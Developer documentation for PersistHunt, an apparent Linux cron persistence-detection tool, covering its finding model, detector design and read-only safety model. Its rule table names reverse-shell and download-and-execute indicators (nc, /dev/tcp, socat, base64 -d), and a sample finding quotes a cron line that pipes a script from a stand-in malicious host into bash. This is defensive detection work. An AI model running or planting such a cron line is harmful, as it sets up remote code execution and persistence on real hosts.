# PersistHunt

PersistHunt is a Linux persistence detection framework written in Python.

---

## Developer Documentation

### Stage 1: Finding Engine

The finding engine provides a standardized representation for security findings. All PersistHunt detection modules use this engine to normalize findings across different persistence mechanisms.

#### Finding Model

A `Finding` represents a single security issue detected on the system:

- `id`: A unique identifier for the finding type (e.g., `PH-CRON-001`).
- `category`: The security category (e.g., `cron`).
- `severity`: Severity level, one of `Severity` enum values (`INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`).
- `title`: Short human-readable summary.
- `description`: Detailed explanation of the detected condition.
- `evidence`: (Optional) The raw line, file reference, or diagnostic triggering detection.
- `location`: (Optional) The filesystem path and line number (e.g., `/etc/cron.d/updater:3`).
- `recommendation`: (Optional) Actionable remediation advice.

#### Available Severity Levels

- `INFO`: Informational or diagnostic observations (e.g., access denied due to permissions).
- `LOW`: Minor anomalies, syntax issues, or broken references.
- `MEDIUM`: Suspicious characteristics that warrant investigation (e.g., execution from `/tmp`, inline interpreter commands).
- `HIGH`: Strong indicators of malicious activity or persistence (e.g., reverse shells, remote download piped to shell, encoded payloads).
- `CRITICAL`: Confirmed high-impact threats.

---

### Stage 2: Detector Architecture & Cron Persistence

Stage 2 introduces the reusable detector architecture and the first production detector: `CronDetector`.

#### Detector Architecture

Every detector in PersistHunt implements the `BaseDetector` abstract base class (`persisthunt.detectors.base`):

```text
BaseDetector
    ├── name: str
    ├── detector_id: str
    └── scan() -> FindingCollection
```

Contract:
- Detectors must expose `name` and `detector_id`.
- Detectors must return a `FindingCollection` containing normalized `Finding` objects.
- Callers interact with detectors through the unified `scan()` interface without needing internal knowledge of the detector.

#### Cron Detector (`CronDetector`)

`CronDetector` audits Linux cron configuration files and scheduled script directories for persistence indicators.

##### Supported Locations

The detector inspects:
- **System crontab**: `/etc/crontab`
- **Cron drop-in directories**: `/etc/cron.d/`
- **Scheduled script directories**:
  - `/etc/cron.hourly/`
  - `/etc/cron.daily/`
  - `/etc/cron.weekly/`
  - `/etc/cron.monthly/`
- **User crontab spools**:
  - `/var/spool/cron/crontabs/` (Debian/Ubuntu)
  - `/var/spool/cron/` (RHEL/CentOS/Fedora)

##### Detection Philosophy: Indicator-Based Auditing

PersistHunt adheres to a strict detection philosophy:
- **Suspicious indicator ≠ Confirmed malicious persistence**: Standard administrative cron jobs (e.g. `logrotate`, package cleanups, routine backups) are normal and must not be marked as critical.
- The detector identifies characteristics commonly used for persistence or stealth rather than asserting malicious intent without evidence.

##### Indicator Rules & Finding IDs

| Finding ID | Category | Severity | Description | Indicators |
|---|---|---|---|---|
| `PH-CRON-001` | cron | `HIGH` | Interactive network utility or raw socket | `/dev/tcp`, `/dev/udp`, `nc`, `ncat`, `netcat`, `socat`, `mkfifo` |
| `PH-CRON-002` | cron | `HIGH` / `MEDIUM` | Remote download utility or piped execution | `curl ... \| bash`, `wget ... \| sh` (`HIGH`); standalone `curl`/`wget` (`MEDIUM`) |
| `PH-CRON-003` | cron | `MEDIUM` | Temporary/writable directory reference | Paths referencing `/tmp/`, `/var/tmp/`, `/dev/shm/` |
| `PH-CRON-004` | cron | `MEDIUM` | Inline interpreter code execution | `python -c`, `perl -e`, `bash -c`, `sh -c` |
| `PH-CRON-005` | cron | `HIGH` | Encoded payload execution | `base64 -d`, `base64 --decode` |
| `PH-CRON-006` | cron | `MEDIUM` | Anomalous file in cron directory | Hidden files (`.filename`) or uncharacteristic binaries |
| `PH-CRON-090` | cron | `INFO` | Unreadable cron location | `PermissionError` (diagnostic finding) |
| `PH-CRON-091` | cron | `LOW` | Broken symlink | Symlink pointing to a missing target |
| `PH-CRON-092` | cron | `LOW` | Malformed cron entry | Invalid field counts or malformed schedule directive |

##### Safety Model

PersistHunt is strictly an auditing tool:
- **Read-Only Inspection**: Opens files strictly in read mode (`r`).
- **No Command Execution**: Never executes cron commands, discovered scripts, or shell utilities.
- **No Network Activity**: Never downloads files or makes network requests.
- **No Modifications**: Never creates, modifies, or deletes system files or crontabs.
- **No Privilege Escalation**: Never attempts to bypass Linux permissions.

##### Permission & Error Handling

- **Permission Denied**: When restricted user crontabs (e.g. `/var/spool/cron/crontabs`) cannot be read by an unprivileged user, the scanner does not crash. It logs a safe diagnostic finding (`PH-CRON-090`, `Severity.INFO`) advising the user to run with appropriate permissions if full spool coverage is needed.
- **Missing Paths**: Missing directories or files are handled gracefully.
- **Malformed Lines**: Non-fatal formatting errors emit `PH-CRON-092` without halting the audit.

#### Usage Example

```python
from persisthunt import CronDetector, Severity

# Initialize and scan
detector = CronDetector()
findings = detector.scan()

# Process results
print(f"Total findings: {findings.count()}")
print(f"Severity counts: {findings.severity_counts()}")

for finding in findings.by_severity(Severity.HIGH):
    print(f"[{finding.id}] {finding.title}")
    print(f"  Location: {finding.location}")
    print(f"  Evidence: {finding.evidence}")
    print(f"  Recommendation: {finding.recommendation}")
```

#### Example Finding Output

```json
{
  "id": "PH-CRON-002",
  "category": "cron",
  "severity": "HIGH",
  "title": "Remote download piped directly into shell/interpreter",
  "description": "Command downloads remote resources and pipes them directly into a shell or interpreter, bypassing disk inspection and file integrity controls.",
  "evidence": "* * * * * root curl -fsSL https://malicious.example/payload.sh | bash",
  "location": "/etc/cron.d/updater:1",
  "recommendation": "Verify the download source URL and terminate any unauthorized scheduled execution."
}
```

---

## Running Tests

Run the test suite using `pytest`:

```bash
pytest
```

Run the demonstration script:

```bash
python demo.py
```
